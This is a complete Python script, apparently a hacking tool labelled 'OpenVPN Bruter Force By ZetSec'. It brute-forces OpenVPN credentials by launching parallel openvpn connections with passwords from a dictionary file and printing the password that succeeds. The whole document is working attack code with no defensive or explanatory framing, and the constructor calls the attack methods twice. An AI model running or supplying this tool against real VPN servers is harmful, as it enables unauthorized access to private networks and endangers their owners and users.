#!/usr/bin/env python
# -*- coding: utf-8 -*-

from multiprocessing.pool import ThreadPool
import os
import sys
import subprocess
import tempfile
import argparse
import shutil
import shlex

TEMP_PATH = "/tmp/ob"


class OpenVPNBr(object):
    def __init__(self):
        self.parse_options()
        self.build_list()
        self.ZETProcess()
        self.cmd_arg
        self.pass_arg

    def parse_options(self):
        parser = argparse.ArgumentParser(
            description="OpenVPN Bruter Force By ZetSec")
        parser.add_argument('--host', type=str, required=True)
        parser.add_argument('--config', type=str, required=True)
        parser.add_argument('--user', type=str, required=True)
        parser.add_argument('--passdict', type=str, required=True)
        self.args = parser.parse_args()

    def cleanU(self):
        shutil.rmtree(TEMP_PATH)
        os.system('kill %d' % os.getpid())

    def build_list(self):
        if not os.path.exists(TEMP_PATH):
            os.makedirs(TEMP_PATH)

        self.cmd_arg = []
        self.pass_arg = []
        with open(self.args.passdict) as pdi:
            for password in pdi:
                try:
                    password = password.strip()
                    fd = tempfile.NamedTemporaryFile(
                        dir=TEMP_PATH, delete=False)
                    fd.write('{0}\n{1}\n'.format(self.args.user, password))
                    fd.flush()
                    fd.close()
                    self.cmd_arg.append(
                        "/usr/sbin/openvpn --remote {0} --config {1} --auth-user-pass {2}".
                        format(self.args.host, self.args.config, fd.name))
                    self.pass_arg.append(password)
                except:
                    raise

    def ZETProcess(self):
        self.pool = ThreadPool(processes=4)
        self.pool.map(self.start_brute, self.cmd_arg)
        self.pool.close()
        self.pool.join()

    def start_brute(self, cmd):
        process = subprocess.Popen(
            shlex.split(cmd),
            shell=False,
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE)
        for outline in iter(process.stdout.readline, ''):
            if "Initialization Sequence Completed" in outline:
                pass_results = self.cmd_arg.index(cmd)
                password = self.pass_arg[pass_results]
                print("Brute success!!! Command = %s" % (cmd))
                print("Password: %s" % (password))
                print("Killall process!")
                self.pool.terminate()
                process.terminate()
                self.cleanU()

    def main(self):
        self.build_list()
        self.ZETProcess()
        print("Brute failed!!! Please try again!")
        self.cleanU()


def main():
    BTO = OpenVPNBr()
    BTO.main()


if __name__ == "__main__":
    main()
